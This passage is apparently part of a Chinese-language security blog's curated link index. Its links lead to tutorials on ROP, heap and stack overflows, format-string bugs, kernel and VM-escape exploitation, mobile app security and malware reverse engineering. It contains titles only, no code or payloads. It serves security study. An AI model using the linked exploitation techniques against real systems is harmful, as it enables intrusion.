<li><a href="https://www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube/" target="_blank" rel="noopener">Chaining DEP with ROP</a></li>
<li><a href="https://www.corelan.be/index.php/2011/12/31/exploit-writing-tutorial-part-11-heap-spraying-demystified/" target="_blank" rel="noopener">Heap Spraying Demystified</a></li>
</ul>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><ul>
<li><a href="http://www.freebuf.com/articles/system/135685.html" target="_blank" rel="noopener">Linux中的GOT和PLT到底是个啥？ </a></li>
<li><a href="http://bobao.360.cn/learning/detail/4490.html" target="_blank" rel="noopener">教练！那根本不是IO！——从printf源码看libc的IO</a></li>
</ul>
<h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><h3 id="一步一步ROP"><a href="#一步一步ROP" class="headerlink" title="一步一步ROP"></a>一步一步ROP</h3><ul>
<li><a href="http://cb.drops.wiki/drops/tips-6597.html" target="_blank" rel="noopener">一步一步学ROP之linux_x86篇</a></li>
<li><a href="http://cb.drops.wiki/drops/papers-7551.html" target="_blank" rel="noopener">一步一步学ROP之linux_x86篇</a></li>
<li><a href="http://cb.drops.wiki/drops/binary-10638.html" target="_blank" rel="noopener">一步一步学ROP之gadgets和2free篇</a></li>
<li><a href="http://cb.drops.wiki/drops/papers-11390.html" target="_blank" rel="noopener">一步一步学ROP之Android ARM 32位篇</a></li>
</ul>
<h3 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h3><ul>
<li><a href="https://medium.com/@iseethieves/intro-to-rop-rop-emporium-split-9b2ec6d4db08" target="_blank" rel="noopener">Intro to ROP: ROP Emporium — Split</a></li>
<li><a href="https://ropemporium.com/" target="_blank" rel="noopener">ROP Emporium</a></li>
<li><a href="https://blog.skullsecurity.org/2013/ropasaurusrex-a-primer-on-return-oriented-programming" target="_blank" rel="noopener">ropasaurusrex: a primer on return-oriented programming2</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3569.html" target="_blank" rel="noopener">ROP技术入门教程</a></li>
<li><a href="https://xianzhi.aliyun.com/forum/read/840.html?fpage=2" target="_blank" rel="noopener">二进制漏洞利用中的ROP技术研究与实例分析</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3694.html" target="_blank" rel="noopener">现代栈溢出利用技术基础：ROP</a></li>
<li><a href="http://wooyun.jozxing.cc/static/drops/binary-14360.html" target="_blank" rel="noopener">通过ELF动态装载构造ROP链</a></li>
<li><a href="http://bestwing.me/2017/03/19/stack-overflow-two-ROP/" target="_blank" rel="noopener">Swing: 基础栈溢出复习 二 之 ROP </a></li>
</ul>
<h3 id="BROP"><a href="#BROP" class="headerlink" title="BROP"></a>BROP</h3><ul>
<li><a href="http://www.scs.stanford.edu/brop/" target="_blank" rel="noopener">Blind Return Oriented Programming</a></li>
<li><a href="http://o0xmuhe.me/2017/01/22/Have-fun-with-Blind-ROP/" target="_blank" rel="noopener">muhe: Have fun with Blind ROP</a></li>
<li><a href="http://bestwing.me/2017/03/24/stack-overflow-four-BROP/" target="_blank" rel="noopener">Swing: 基础栈溢出复习 四 之 BROP </a></li>
</ul>
<h3 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h3><ul>
<li><a href="http://www.freebuf.com/articles/network/87447.html" target="_blank" rel="noopener">Sigreturn Oriented Programming (SROP) Attack攻击原理</a></li>
<li><a href="http://bestwing.me/2017/03/20/stack-overflow-three-SROP/" target="_blank" rel="noopener">Swing: 基础栈溢出复习 三 之 SROP </a></li>
</ul>
<h3 id="Return-to-dl-resolve"><a href="#Return-to-dl-resolve" class="headerlink" title="Return-to-dl-resolve"></a>Return-to-dl-resolve</h3><ul>
<li><a href="http://www.freebuf.com/articles/system/149214.html" target="_blank" rel="noopener">如何在32位系统中使用ROP+Return-to-dl来绕过ASLR+DEP</a></li>
<li><a href="http://www.evil0x.com/posts/19226.html" target="_blank" rel="noopener">通过ELF动态装载构造ROP链 （ Return-to-dl-resolve）</a></li>
</ul>
<h2 id="栈漏洞"><a href="#栈漏洞" class="headerlink" title="栈漏洞"></a>栈漏洞</h2><ul>
<li><a href="http://bobao.360.cn/learning/detail/3717.html" target="_blank" rel="noopener">手把手教你栈溢出从入门到放弃（上）</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3718.html" target="_blank" rel="noopener">手把手教你栈溢出从入门到放弃（下）</a></li>
<li><a href="http://0x48.pw/2016/11/03/0x26/" target="_blank" rel="noopener">Hcamael: PWN学习总结之基础栈溢出</a></li>
<li><a href="http://0x48.pw/2016/11/21/0x27/" target="_blank" rel="noopener">Hcamael: PWN学习总结之基础栈溢出2 </a></li>
<li><a href="http://bestwing.me/2017/03/18/stack-overflow-one/" target="_blank" rel="noopener">Swing: 基础栈溢出复习 之基础</a></li>
<li><a href="http://www.freebuf.com/articles/terminal/107276.html" target="_blank" rel="noopener">ARM栈溢出攻击实践：从虚拟环境搭建到ROP利用 </a></li>
<li><a href="https://blog.techorganic.com/2015/04/10/64-bit-linux-stack-smashing-tutorial-part-1/" target="_blank" rel="noopener">64-bit Linux stack smashing tutorial: Part 1</a></li>
<li><a href="https://blog.techorganic.com/2015/04/21/64-bit-linux-stack-smashing-tutorial-part-2/" target="_blank" rel="noopener">64-bit Linux stack smashing tutorial: Part 2</a></li>
<li><a href="https://blog.techorganic.com/2016/03/18/64-bit-linux-stack-smashing-tutorial-part-3/" target="_blank" rel="noopener">64-bit Linux stack smashing tutorial: Part 3</a></li>
<li><a href="http://cybersecurity.upv.es/attacks/offset2lib/offset2lib.html" target="_blank" rel="noopener">Offset2lib: bypassing full ASLR on 64bit Linu</a></li>
<li><a href="https://www.tuicool.com/articles/VVBz6va" target="_blank" rel="noopener">return2libc学习笔记</a></li>
</ul>
<h2 id="堆漏洞"><a href="#堆漏洞" class="headerlink" title="堆漏洞"></a>堆漏洞</h2><ul>
<li><a href="https://heap-exploitation.dhavalkapil.com/introduction.html" target="_blank" rel="noopener">Heap Exploitation</a></li>
<li><a href="https://github.com/shellphish/" target="_blank" rel="noopener">how2heap</a></li>
</ul>
<h3 id="堆相关知识"><a href="#堆相关知识" class="headerlink" title="堆相关知识"></a>堆相关知识</h3><ul>
<li><a href="http://paper.seebug.org/255/" target="_blank" rel="noopener">PWN之堆内存管理</a></li>
<li><a href="http://www.freebuf.com/articles/system/104144.html" target="_blank" rel="noopener">Linux堆内存管理深入分析（上） </a></li>
<li><a href="http://www.freebuf.com/articles/security-management/105285.html" target="_blank" rel="noopener">Linux堆内存管理深入分析（下） </a></li>
<li><a href="http://bobao.360.cn/learning/detail/3548.html" target="_blank" rel="noopener">Windows Exploit开发系列教程——堆喷射（一）</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3555.html" target="_blank" rel="noopener">Windows Exploit开发系列教程——堆喷射（二）</a></li>
<li><a href="http://www.freebuf.com/articles/system/91527.html" target="_blank" rel="noopener">Libc堆管理机制及漏洞利用技术 (一） </a></li>
<li><a href="https://blog.iret.xyz/article.aspx/linux_heapoverflow_enterance" target="_blank" rel="noopener">Notes About Heap Overflow Under Linux</a></li>
<li><a href="http://www.freebuf.com/vuls/98404.html" target="_blank" rel="noopener">如何理解堆和堆溢出漏洞的利用?</a></li>
<li><a href="http://o0xmuhe.me/2016/11/21/Have-fun-with-glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/" target="_blank" rel="noopener">Have fun with glibc内存管理</a></li>
<li><a href="http://www.tuicool.com/articles/A7n2ueq" target="_blank" rel="noopener">内存映射mmap</a></li>
<li><a href="http://0x48.pw/2017/07/25/0x35/" target="_blank" rel="noopener">glibc malloc学习笔记之fastbin</a></li>
<li><a href="http://0x48.pw/2017/08/07/0x37/" target="_blank" rel="noopener">malloc.c源码阅读之__libc_free</a></li>
<li><a href="http://www.cnblogs.com/wangaohui/p/5190889.html" target="_blank" rel="noopener">Malloc碎碎念</a></li>
<li><a href="http://blog.csdn.net/maokelong95/article/details/52006379" target="_blank" rel="noopener">glibc内存分配与回收过程图解</a></li>
<li><a href="http://blog.csdn.net/maokelong95/article/details/51989081#allocated-chunk" target="_blank" rel="noopener">理解 glibc malloc</a></li>
</ul>
<h3 id="堆利用技术"><a href="#堆利用技术" class="headerlink" title="堆利用技术"></a>堆利用技术</h3><ul>
<li><a href="http://bobao.360.cn/learning/detail/4386.html" target="_blank" rel="noopener">how2heap总结-上</a></li>
<li><a href="http://bobao.360.cn/learning/detail/4383.html" target="_blank" rel="noopener">how2heap总结-下</a></li>
<li><a href="http://wooyun.jozxing.cc/static/drops/binary-14596.html" target="_blank" rel="noopener">溢出科普：heap overflow&amp;溢出保护和绕过</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3197.html" target="_blank" rel="noopener">现代化的堆相关漏洞利用技巧</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3113.html" target="_blank" rel="noopener">从一字节溢出到任意代码执行-Linux下堆漏洞利用</a></li>
<li><a href="https://sploitfun.wordpress.com/2015/02/26/heap-overflow-using-unlink/?spm=a313e.7916648.0.0.x4nzYZ" target="_blank" rel="noopener">Heap overflow using unlink</a></li>
<li><a href="https://www.tuicool.com/articles/E3Ezu2u" target="_blank" rel="noopener">堆溢出的unlink利用方法</a></li>
<li><a href="https://jaq.alibaba.com/community/art/show?spm=a313e.7916646.24000001.74.ZP8rXN&amp;articleid=360" target="_blank" rel="noopener">Linux堆溢出漏洞利用之unlink</a></li>
<li><a href="http://www.freebuf.com/news/88660.html?utm_source=tuicool&amp;utm_medium=referral" target="_blank" rel="noopener">浅析Linux堆溢出之fastbin</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3996.html" target="_blank" rel="noopener">Linux堆溢出之Fastbin Attack实例详解</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3296.html" target="_blank" rel="noopener">unsorted bin attack分析</a></li>
<li><a href="http://www.vuln.cn/6172" target="_blank" rel="noopener">Double Free浅析</a></li>
<li><a href="http://www.blackhat.com/presentations/bh-usa-07/Ferguson/Whitepaper/bh-usa-07-ferguson-WP.pdf" target="_blank" rel="noopener">Understanding the heap by breaking it</a></li>
<li><a href="https://www.purehacking.com/blog/lloyd-simon/an-introduction-to-use-after-free-vulnerabilities" target="_blank" rel="noopener">An Introduction to Use After Free Vulnerabilities</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3379.html?utm_source=tuicool&amp;utm_medium=referral" target="_blank" rel="noopener">Use After Free漏洞浅析</a></li>
<li><a href="http://d0m021ng.github.io/2017/03/04/PWN/Linux堆漏洞之Use-after-free实例/" target="_blank" rel="noopener">Linux堆漏洞之Use after free实例</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3417.html" target="_blank" rel="noopener">堆之House of Spirit</a></li>
<li><a href="http://www.freebuf.com/articles/system/151372.html" target="_blank" rel="noopener">Dance In Heap（一）：浅析堆的申请释放及相应保护机制 </a></li>
<li><a href="http://www.freebuf.com/articles/system/151407.html" target="_blank" rel="noopener">Dance In Heap（二）：一些堆利用的方法（上） </a></li>
<li><a href="http://www.freebuf.com/articles/system/151428.html" target="_blank" rel="noopener">Dance In Heap（三）：一些堆利用的方法（中） </a></li>
<li><a href="http://www.freebuf.com/articles/system/151435.html" target="_blank" rel="noopener">Dance In Heap（四）：一些堆利用的方法（下） </a></li>
<li><a href="https://info.contextis.com/acton/attachment/24535/f-02c8/1/-/-/-/-/Glibc%20Adventures%3A%20The%20forgotten%20chunks.pdf" target="_blank" rel="noopener">Glibc Adventures：The Forgotten Chunks</a></li>
</ul>
<h2 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h2><ul>
<li><a href="https://crypto.stanford.edu/cs155old/cs155-spring08/papers/formatstring-1.2.pdf" target="_blank" rel="noopener">Exploiting Format String Vulnerabilities</a></li>
<li><a href="http://cb.drops.wiki/drops/binary-6259.html" target="_blank" rel="noopener">二进制漏洞之——邪恶的printf</a></li>
<li><a href="http://cb.drops.wiki/drops/papers-9426.html" target="_blank" rel="noopener">漏洞挖掘基础之格式化字符串</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3654.html" target="_blank" rel="noopener">格式化字符串漏洞利用小结（一）</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3674.html" target="_blank" rel="noopener">格式化字符串漏洞利用小结（二）</a></li>
<li><a href="http://www.cnblogs.com/Ox9A82/p/5429099.html" target="_blank" rel="noopener">Linux下的格式化字符串漏洞利用姿势</a></li>
<li><a href="http://0x48.pw/2017/03/13/0x2c/?utm_source=tuicool&amp;utm_medium=referral" target="_blank" rel="noopener">Linux系统下格式化字符串利用研究 </a></li>
<li><a href="http://phrack.org/issues/59/7.html" target="_blank" rel="noopener">Advances in format string exploitation</a></li>
<li><a href="http://www.vnsecurity.net/research/2012/02/16/exploiting-sudo-format-string-vunerability.html" target="_blank" rel="noopener">Exploiting Sudo format string vunerability</a></li>
</ul>
<h2 id="其余漏洞"><a href="#其余漏洞" class="headerlink" title="其余漏洞"></a>其余漏洞</h2><h3 id="FSP溢出"><a href="#FSP溢出" class="headerlink" title="FSP溢出"></a>FSP溢出</h3><ul>
<li><a href="http://wooyun.jozxing.cc/static/drops/binary-12740.html" target="_blank" rel="noopener">Head First FILE Stream Pointer Overflow</a></li>
<li><a href="https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/" target="_blank" rel="noopener">abusing the FILE structure</a></li>
<li><a href="http://repo.thehackademy.net/depot_ouah/fsp-overflows.txt" target="_blank" rel="noopener">File Stream Pointer Overflows Paper.</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3219.html" target="_blank" rel="noopener">溢出利用FILE结构体</a></li>
</ul>
<h3 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h3><ul>
<li><a href="http://blog.csdn.net/wuxiaobingandbob/article/details/44618925" target="_blank" rel="noopener">整数溢出漏洞</a></li>
</ul>
<h2 id="保护绕过"><a href="#保护绕过" class="headerlink" title="保护绕过"></a>保护绕过</h2><h3 id="Cannary绕过"><a href="#Cannary绕过" class="headerlink" title="Cannary绕过"></a>Cannary绕过</h3><ul>
<li><a href="http://0x48.pw/2017/03/14/0x2d/" target="_blank" rel="noopener">栈溢出之绕过CANARY保护 </a></li>
<li><a href="http://veritas501.space/2017/04/28/论canary的几种玩法/" target="_blank" rel="noopener">论canary的几种玩法</a></li>
<li><a href="http://yunnigu.dropsec.xyz/2017/03/20/Liunx下关于绕过cancry保护总结/" target="_blank" rel="noopener">Liunx下关于绕过cancry保护总结</a></li>
</ul>
<h2 id="内核"><a href="#内核" class="headerlink" title="内核"></a>内核</h2><ul>
<li><a href="https://github.com/k0keoyo/Some-Kernel-Fuzzing-Paper" target="_blank" rel="noopener">Some-Kernel-Fuzzing-Paper</a></li>
<li><a href="Introduction to Windows Kernel Driver Exploitation (Pt. 1">Introduction to Windows Kernel Driver Exploitation (Pt. 1) - Environment Setup</a> - Environment Setup)</li>
<li><a href="https://glennmcgui.re/introduction-to-windows-kernel-driver-exploitation-pt-2/" target="_blank" rel="noopener">Introduction to Windows Kernel Driver Exploitation (Pt. 2) - Stack Buffer Overflow to System Shell</a></li>
<li><a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver" target="_blank" rel="noopener">HackSysExtremeVulnerableDriver</a></li>
<li><a href="https://hshrzd.wordpress.com/2017/05/28/starting-with-windows-kernel-exploitation-part-1-setting-up-the-lab/" target="_blank" rel="noopener">Starting with Windows Kernel Exploitation – part 1 – setting up the lab</a></li>
<li><a href="https://hshrzd.wordpress.com/2017/06/05/starting-with-windows-kernel-exploitation-part-2/" target="_blank" rel="noopener">Starting with Windows Kernel Exploitation – part 2 – getting familiar with HackSys Extreme Vulnerable Driver</a></li>
<li><a href="http://bobao.360.cn/learning/detail/4477.html" target="_blank" rel="noopener">利用WinDbg本地内核调试器攻陷 Windows 内核</a></li>
<li><a href="http://bobao.360.cn/learning/detail/4002.html" target="_blank" rel="noopener">Windows内核利用之旅：熟悉HEVD（附视频演示）</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3718.html" target="_blank" rel="noopener">Windows 内核攻击：栈溢出</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3700.html" target="_blank" rel="noopener">Linux 内核漏洞利用教程（一）：环境配置</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3702.html" target="_blank" rel="noopener">Linux 内核漏洞利用教程（二）：两个Demo</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3706.html" target="_blank" rel="noopener">Linux 内核漏洞利用教程（三）：实践 CSAW CTF 题目</a></li>
<li><a href="http://www.freebuf.com/articles/system/94198.html" target="_blank" rel="noopener">Linux内核ROP姿势详解(一) </a></li>
<li><a href="http://www.freebuf.com/articles/system/135402.html" target="_blank" rel="noopener">Linux内核ROP姿势详解（二）</a></li>
</ul>
<h2 id="虚拟机逃逸"><a href="#虚拟机逃逸" class="headerlink" title="虚拟机逃逸"></a>虚拟机逃逸</h2><ul>
<li><a href="https://www.exploit-db.com/papers/42883/" target="_blank" rel="noopener">Phrack: VM escape - QEMU Case Study</a></li>
<li><a href="http://bbs.pediy.com/thread-217997.htm" target="_blank" rel="noopener">虚拟机逃逸——QEMU的案例分析（一）</a></li>
<li><a href="http://bbs.pediy.com/thread-217999.htm" target="_blank" rel="noopener">虚拟机逃逸——QEMU的案例分析（二）</a></li>
<li><a href="http://bbs.pediy.com/thread-218045.htm" target="_blank" rel="noopener">虚拟机逃逸——QEMU的案例分析（三） </a></li>
</ul>
<h2 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h2><ul>
<li><a href="http://bobao.360.cn/learning/detail/4070.html" target="_blank" rel="noopener">ARM 汇编基础速成1：ARM汇编以及汇编语言基础介绍</a></li>
<li><a href="http://bobao.360.cn/learning/detail/4075.html" target="_blank" rel="noopener">ARM 汇编基础速成2：ARM汇编中的数据类型</a></li>
<li><a href="http://bobao.360.cn/learning/detail/4082.html" target="_blank" rel="noopener">ARM 汇编基础速成3：ARM模式与THUMB模式</a></li>
<li><a href="http://bobao.360.cn/learning/detail/4087.html" target="_blank" rel="noopener">ARM 汇编基础速成4：ARM汇编内存访问相关指令</a></li>
<li><a href="http://bobao.360.cn/learning/detail/4097.html" target="_blank" rel="noopener">ARM 汇编基础速成5：连续存取</a></li>
<li><a href="http://bobao.360.cn/learning/detail/4104.html" target="_blank" rel="noopener">ARM 汇编基础速成6：条件执行与分支</a></li>
<li><a href="http://bobao.360.cn/learning/detail/4108.html" target="_blank" rel="noopener">ARM 汇编基础速成7：栈与函数</a></li>
</ul>
<h2 id="Lua"><a href="#Lua" class="headerlink" title="Lua"></a>Lua</h2><ul>
<li><a href="http://bobao.360.cn/learning/detail/4534.html" target="_blank" rel="noopener">Lua程序逆向之Luac文件格式分析</a></li>
</ul>
<h2 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h2><ul>
<li><a href="http://bobao.360.cn/learning/detail/4131.html" target="_blank" rel="noopener">10种常见的进程注入技术的总结</a></li>
<li><a href="http://www.freebuf.com/articles/system/143640.html" target="_blank" rel="noopener">系统安全攻防战：DLL注入技术详解 </a></li>
</ul>
<h2 id="符号执行"><a href="#符号执行" class="headerlink" title="符号执行"></a>符号执行</h2><ul>
<li><a href="https://github.com/enzet/symbolic-execution" target="_blank" rel="noopener">关于符号执行</a></li>
<li><a href="http://www.miasm.re/blog/2017/10/05/playing_with_dynamic_symbolic_execution.html" target="_blank" rel="noopener">Playing with Dynamic symbolic execution</a></li>
</ul>
<h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><ul>
<li><a href="http://bobao.360.cn/learning/detail/4213.html" target="_blank" rel="noopener">看我如何对Apache进行模糊测试并挖到了一个价值1500刀的漏洞</a></li>
</ul>
<h2 id="CTF中的pwn"><a href="#CTF中的pwn" class="headerlink" title="CTF中的pwn"></a>CTF中的pwn</h2><ul>
<li><a href="https://github.com/jmpews/pwn2exploit" target="_blank" rel="noopener">pwn &amp; exploit</a></li>
</ul>
<h3 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h3><ul>
<li><a href="http://bobao.360.cn/learning/detail/3300.html" target="_blank" rel="noopener">跟我入坑PWN第一章</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3339.html" target="_blank" rel="noopener">跟我入坑PWN第二章</a></li>
</ul>
<h3 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h3><ul>
<li><a href="http://bobao.360.cn/learning/detail/3298.html?utm_source=tuicool&amp;utm_medium=referral" target="_blank" rel="noopener">借助DynELF实现无libc的漏洞利用小结</a></li>
<li><a href="http://o0xmuhe.me/2016/12/24/what-DynELF-does-basically/" target="_blank" rel="noopener">what DynELF does basically </a></li>
<li><a href="http://uaf.io/exploitation/misc/2016/04/02/Finding-Functions.html" target="_blank" rel="noopener">Finding Function’s Load Address </a></li>
</ul>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
<li><a href="https://github.com/stfpeak/CTF" target="_blank" rel="noopener">CTF总结</a></li>
<li><a href="http://skysider.com/?p=223" target="_blank" rel="noopener">pwn tips</a></li>
<li><a href="https://github.com/Naetw/CTF-pwn-tips" target="_blank" rel="noopener">CTF-pwn-tips</a></li>
<li><a href="http://www.angelwhu.com/blog/?p=460" target="_blank" rel="noopener">pwn 学习总结</a></li>
<li><a href="http://www.cnblogs.com/Ox9A82/p/5559167.html" target="_blank" rel="noopener">CTF中做Linux下漏洞利用的一些心得</a></li>
<li><a href="http://drops.xmd5.com/static/drops/binary-6521.html" target="_blank" rel="noopener">linux常见漏洞利用技术实践</a></li>
</ul>
<h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><ul>
<li><a href="http://0x48.pw/2017/08/01/0x36/" target="_blank" rel="noopener">堆溢出学习之0CTF 2017 Babyheap </a></li>
<li><a href="http://bobao.360.cn/learning/detail/3189.html" target="_blank" rel="noopener">一道有趣的CTF PWN题</a></li>
<li><a href="https://github.com/1u4nx/Exploit-Exercises-Nebula" target="_blank" rel="noopener">Exploit-Exercises Nebula全攻略</a></li>
<li><a href="http://wooyun.jozxing.cc/static/drops/binary-16700.html" target="_blank" rel="noopener">三个白帽之从pwn me调试到Linux攻防学习</a></li>
</ul>
<h1 id="Android-Security"><a href="#Android-Security" class="headerlink" title="Android Security"></a>Android Security</h1><h2 id="Exercise"><a href="#Exercise" class="headerlink" title="Exercise"></a>Exercise</h2><ul>
<li><a href="https://github.com/payatu/diva-android/" target="_blank" rel="noopener">DIVA Android</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzI4NjEyMDk0MA==&amp;mid=2649846643&amp;idx=1&amp;sn=0286e8f1b3e6da0acbd129cb248eac2a" target="_blank" rel="noopener">Android安全项目入门篇</a></li>
</ul>
<h2 id="Skill"><a href="#Skill" class="headerlink" title="Skill"></a>Skill</h2><ul>
<li><a href="http://bobao.360.cn/learning/detail/4428.html" target="_blank" rel="noopener">Android应用逆向工程</a></li>
<li><a href="http://www.ikey4u.com/blog/android-develop/android-so/" target="_blank" rel="noopener">初探 Android SO 开发</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247484642&amp;idx=1&amp;sn=d34ec8b6fc9b5a63b627316e13821b13&amp;chksm=ec1e34cadb69bddc80598c93a0aef429d0b1d668b4fc6e5e6b31a7a3ebfa713aafda1f1b8f7a&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">Android App漏洞学习（一）</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247484706&amp;idx=1&amp;sn=eb49d5f71f89fd4d2e3bec23c44c0ae6&amp;chksm=ec1e350adb69bc1c9f775bfaf997459e1cfa3beb065f553ed90fbd88220d7739487e9f7208bd#rd" target="_blank" rel="noopener">Android App漏洞学习（二） </a></li>
<li><a href="http://wiki.ioin.in/sort/android" target="_blank" rel="noopener">WIKI: Android</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247484387&amp;idx=1&amp;sn=7264428205276452d40c1ef7b1ed0dcc&amp;chksm=ec1e33cbdb69badd00794f81caa43e5d62e0dc9bb7b9baa9d4c3c9eb64a3a0a18613356bf584#rd" target="_blank" rel="noopener">Android组件安全</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/28107901" target="_blank" rel="noopener">通过 WebView 攻击 Android 应用</a></li>
</ul>
<h2 id="Tool"><a href="#Tool" class="headerlink" title="Tool"></a>Tool</h2><ul>
<li><a href="http://bobao.360.cn/learning/detail/4254.html" target="_blank" rel="noopener">走到哪黑到哪——Android渗透测试三板斧</a></li>
<li><a href="http://www.4hou.com/penetration/6916.html" target="_blank" rel="noopener">Brida:将frida与burp结合进行移动app渗透测试</a></li>
</ul>
<h1 id="浏览器安全"><a href="#浏览器安全" class="headerlink" title="浏览器安全"></a>浏览器安全</h1><ul>
<li><a href="http://www.freebuf.com/articles/others-articles/145586.html" target="_blank" rel="noopener">浅谈多浏览器的自动化测试</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/28719766" target="_blank" rel="noopener">浏览器漏洞挖掘思路</a></li>
<li><a href="http://blog.topsec.com.cn/ad_lab/ie%E6%BC%8F%E6%B4%9E%E6%94%BB%E9%98%B2%E7%BC%96%E5%B9%B4%E7%AE%80%E5%8F%B2/" target="_blank" rel="noopener">IE漏洞攻防编年简史</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3666.html" target="_blank" rel="noopener">IE浏览器漏洞综合利用技术：UAF利用技术的发展</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3656.html" target="_blank" rel="noopener">IE浏览器漏洞综合利用技术：堆喷射技术</a></li>
<li><a href="https://github.com/cure53/browser-sec-whitepaper" target="_blank" rel="noopener">cure53-browser-sec-whitepaper</a></li>
<li>[X41-Browser-Security-White-Paper.pd</li>
</ul>
<h1 id="IOS-OSX-Securiy"><a href="#IOS-OSX-Securiy" class="headerlink" title="IOS/OSX Securiy"></a>IOS/OSX Securiy</h1><ul>
<li><a href="https://github.com/michalmalik/osx-re-101" target="_blank" rel="noopener">OSX/iOS reverse engineering</a></li>
</ul>
<h2 id="IOS"><a href="#IOS" class="headerlink" title="IOS"></a>IOS</h2><h3 id="Exercise-1"><a href="#Exercise-1" class="headerlink" title="Exercise"></a>Exercise</h3><ul>
<li><a href="http://damnvulnerableiosapp.com/#trainings" target="_blank" rel="noopener">Damn Vulnerable iOS Application (DVIA)</a></li>
</ul>
<h3 id="Skill-1"><a href="#Skill-1" class="headerlink" title="Skill"></a>Skill</h3><ul>
<li><a href="https://github.com/pandazheng/IosHackStudy" target="_blank" rel="noopener">IosHackStudy</a></li>
<li><a href="https://papers.put.as/ios/ios/" target="_blank" rel="noopener">Papers, Slides and Thesis Archive : iOS</a></li>
<li><a href="http://security.ios-wiki.com/" target="_blank" rel="noopener">ios-wiki: iOS Security</a></li>
<li><a href="https://www.apple.com/business/docs/iOS_Security_Guide.pdf" target="_blank" rel="noopener">apple官方文档：iOS Security</a></li>
<li><a href="http://esoftmobile.com/2014/02/14/ios-security/" target="_blank" rel="noopener">iOS安全系列汇总</a></li>
<li><a href="https://security.tencent.com/index.php/blog/msg/105" target="_blank" rel="noopener">浅谈iOS应用安全自动化审计</a></li>
<li><a href="http://www.freebuf.com/articles/terminal/123098.html" target="_blank" rel="noopener">iOS安全审计入门</a></li>
<li><a href="http://blog.pangu.io/xkungfoo2015/" target="_blank" rel="noopener">iOS内核漏洞挖掘–fuzz&amp;代码审计</a></li>
</ul>
<h2 id="OSX"><a href="#OSX" class="headerlink" title="OSX"></a>OSX</h2><h3 id="Exercise-2"><a href="#Exercise-2" class="headerlink" title="Exercise"></a>Exercise</h3><ul>
<li><a href="https://reverse.put.as/crackmes/" target="_blank" rel="noopener">OS X : Crackmes</a></li>
<li><a href="http://bobao.360.cn/learning/detail/4501.html" target="_blank" rel="noopener">OS X内核大揭秘之基础篇</a></li>
<li><a href="http://bobao.360.cn/learning/detail/4500.html" target="_blank" rel="noopener">OS X内核大揭秘之利用篇</a></li>
</ul>
<h3 id="Skill-2"><a href="#Skill-2" class="headerlink" title="Skill"></a>Skill</h3><ul>
<li><a href="https://papers.put.as/macosx/macosx/" target="_blank" rel="noopener">Papers, Slides and Thesis Archive : Mac OS X</a></li>
<li><a href="https://paper.seebug.org/380/" target="_blank" rel="noopener">实现 macOS 内核监控的几种方法</a></li>
</ul>
<h1 id="蓝牙安全"><a href="#蓝牙安全" class="headerlink" title="蓝牙安全"></a>蓝牙安全</h1><ul>
<li><a href="https://csrc.nist.gov/csrc/media/publications/sp/800-121/rev-2/draft/documents/sp800_121_r2_draft.pdf" target="_blank" rel="noopener">Guide to Bluetooth Security</a></li>
</ul>
<h1 id="malware"><a href="#malware" class="headerlink" title="malware"></a>malware</h1><ul>
<li><a href="https://qmemcpy.io/post/reverse-engineering-malware-trickbot-part-1-packer" target="_blank" rel="noopener">Reverse engineering malware: TrickBot (part 1 - packer)</a></li>
<li><a href="https://qmemcpy.io/post/reverse-engineering-malware-trickbot-part-2-loader" target="_blank" rel="noopener">Reverse engineering malware: TrickBot (part 2 - loader)</a></li>
<li><a href="https://qmemcpy.io/post/reverse-engineering-malware-trickbot-part-3-core" target="_blank" rel="noopener">Reverse engineering malware: TrickBot (part 3 - core)</a></li>
<li><a href="http://blog.nsfocus.net/malware-sample-analysis-summary/" target="_blank" rel="noopener">《恶意样本分析手册》合辑</a></li>
</ul>
